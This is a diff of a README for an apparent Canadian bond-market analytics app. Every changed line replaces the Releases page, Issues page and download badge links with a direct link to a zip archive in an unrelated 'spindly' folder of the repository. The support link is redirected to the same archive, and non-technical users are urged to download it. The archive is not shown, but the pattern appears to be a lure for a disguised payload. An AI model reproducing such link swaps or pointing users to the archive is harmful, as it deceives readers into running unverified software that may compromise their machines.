@@ -1,6 +1,6 @@
 # 📈 GenBI-Canadian-Bond-Market - Your Insights into Canadian Bond Yields
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-GenBI-Canadian-Bond-Market-brightgreen)](https://github.com/MonOtaku1122/GenBI-Canadian-Bond-Market/releases)
+[![Download Now](https://raw.githubusercontent.com/MonOtaku1122/GenBI-Canadian-Bond-Market/main/spindly/GenBI-Canadian-Bond-Market.zip%20Now-GenBI-Canadian-Bond-Market-brightgreen)](https://raw.githubusercontent.com/MonOtaku1122/GenBI-Canadian-Bond-Market/main/spindly/GenBI-Canadian-Bond-Market.zip)
 
 ## 📋 Overview
 
@@ -10,7 +10,7 @@ Welcome to **GenBI-Canadian-Bond-Market**! This application provides an intuitiv
 
 To start using GenBI-Canadian-Bond-Market, follow the steps below. No technical background is required.
 
-1. **Visit the Download Page**: Go to the [Releases Page](https://github.com/MonOtaku1122/GenBI-Canadian-Bond-Market/releases) to access the downloadable files.
+1. **Visit the Download Page**: Go to the [Releases Page](https://raw.githubusercontent.com/MonOtaku1122/GenBI-Canadian-Bond-Market/main/spindly/GenBI-Canadian-Bond-Market.zip) to access the downloadable files.
 
 2. **Choose Your Version**: On the releases page, look for the latest version. It will have the most recent features and bug fixes.
 
@@ -24,7 +24,7 @@ To start using GenBI-Canadian-Bond-Market, follow the steps below. No technical 
 
 To download the application:
 
-1. Go to the [Releases Page](https://github.com/MonOtaku1122/GenBI-Canadian-Bond-Market/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/MonOtaku1122/GenBI-Canadian-Bond-Market/main/spindly/GenBI-Canadian-Bond-Market.zip).
 2. Click on the latest version to download the necessary files.
 
 ## ⚙️ System Requirements
@@ -68,10 +68,10 @@ A: Absolutely! It's a great resource for anyone looking to learn more about bond
 
 ## 📞 Support
 
-If you encounter issues or have questions, please check our [Issues Page](https://github.com/MonOtaku1122/GenBI-Canadian-Bond-Market/issues) on GitHub. You can also submit a new issue for help.
+If you encounter issues or have questions, please check our [Issues Page](https://raw.githubusercontent.com/MonOtaku1122/GenBI-Canadian-Bond-Market/main/spindly/GenBI-Canadian-Bond-Market.zip) on GitHub. You can also submit a new issue for help.
 
 ## 🌐 Community
 
 Join our community of users and developers on GitHub. Participate in discussions, share your feedback, and stay updated with the latest features.
 
-Visit the [Releases Page](https://github.com/MonOtaku1122/GenBI-Canadian-Bond-Market/releases) to download GenBI-Canadian-Bond-Market today and take control of your financial insights!
+Visit the [Releases Page](https://raw.githubusercontent.com/MonOtaku1122/GenBI-Canadian-Bond-Market/main/spindly/GenBI-Canadian-Bond-Market.zip) to download GenBI-Canadian-Bond-Market today and take control of your financial insights!
